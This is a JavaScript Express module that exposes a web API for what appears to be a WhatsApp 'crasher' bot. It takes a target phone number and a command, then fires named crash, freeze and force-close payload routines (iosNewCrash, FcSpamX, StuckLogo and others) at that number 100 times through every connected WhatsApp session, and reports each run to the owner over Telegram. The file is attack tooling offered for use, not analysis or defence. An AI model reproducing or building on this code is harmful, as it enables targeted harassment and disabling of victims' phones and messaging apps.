const express = require("express");
const bodyParser = require("body-parser");

const BOT_API_KEY = "dora-crasher-secret-key";
const BOT_API_PORT = process.env.BOT_API_PORT || 4000;

let botContext = null;
const apiApp = express();

apiApp.use(bodyParser.json());

function initBotApi(context) {
    botContext = context;

    apiApp.post("/api/execute", async (req, res) => {
        const apiKey = req.headers["x-api-key"];
        if (apiKey !== BOT_API_KEY) {
            return res.status(401).json({ success: false, message: "Unauthorized" });
        }

        const { target, command, user } = req.body;
        if (!target || !command) {
            return res.status(400).json({ success: false, message: "Missing target or command" });
        }

        try {
            const X = target + "@s.whatsapp.net";
            const targets = botContext.getActiveSocks(botContext.ownerId);

            if (!targets.length) {
                return res.status(400).json({ success: false, message: "No active WhatsApp sessions" });
            }

            botContext.log.info("🌐 WEB API: /" + command + " → " + target + " (by " + user + ")");

            (async () => {
                for (let z = 0; z < 100; z++) {
                    for (const { sock: client, id: sessionId } of targets) {
                        try {
                            switch (command) {
                                case "IOSCRASH":
                                    await botContext.bugs.iosNewCrash(client, X);
                                    await botContext.bugs.IosdoraInvisible(client, X);
                                    break;
                                case "DORAIOS":
                                    await botContext.bugs.dora(client, X);
                                    await botContext.bugs.fiOS(client, X);
                                    break;
                                case "frezewa":
                                    await botContext.bugs.StuckNewAmba(client, X);
                                    await botContext.bugs.XvZFreezeXDelayHard(client, X);
                                    break;
                                case "fcbeta":
                                    await botContext.bugs.Cong(client, X);
                                    break;
                                case "andro":
                                    await botContext.bugs.FcSpamX(client, X);
                                    await botContext.bugs.FcSpamX(client, X);
                                    break;
                                case "DelayHard":
                                    await botContext.bugs.StuckLogo(client, X);
                                    await botContext.bugs.StuckNewAmba(client, X);
                                    await botContext.bugs.XvZFreezeXDelayHard(client, X);
                                    break;
                                case "buldozer":
                                    await botContext.bugs.StuckLogo(client, X);
                                    await botContext.bugs.StuckDora(client, X);
                                    break;
                                case "hima":
                                    await botContext.bugs.Fcinvisible(client, X);
                                    break;
                                case "DoraFc":
                                    await botContext.bugs.DoraFc(client, X);
                                    break;
                                default:
                                    botContext.log.error("Unknown command: " + command);
                            }
                        } catch (e) {
                            botContext.log.error("[" + sessionId + "] API " + command + ": " + e.message);
                        }
                    }
                }
            })();

            try {
                await botContext.bot.api.sendMessage(
                    botContext.ownerId,
                    "🌐 <b>WEB API EXECUTION</b>\n" +
                    "👤 User: <code>" + user + "</code>\n" +
                    "📱 Target: <code>" + target + "</code>\n" +
                    "🦠 Command: <code>/" + command + "</code>",
                    { parse_mode: "HTML" }
                );
            } catch (e) {}

            res.json({ success: true, message: "Queued" });
        } catch (e) {
            res.status(500).json({ success: false, message: e.message });
        }
    });

    apiApp.get("/api/health", (req, res) => {
        res.json({ status: "ok", time: new Date().toISOString() });
    });

    apiApp.listen(BOT_API_PORT, () => {
        console.log("✅ BOT API RUNNING ON PORT " + BOT_API_PORT);
    });
}

module.exports = { initBotApi };
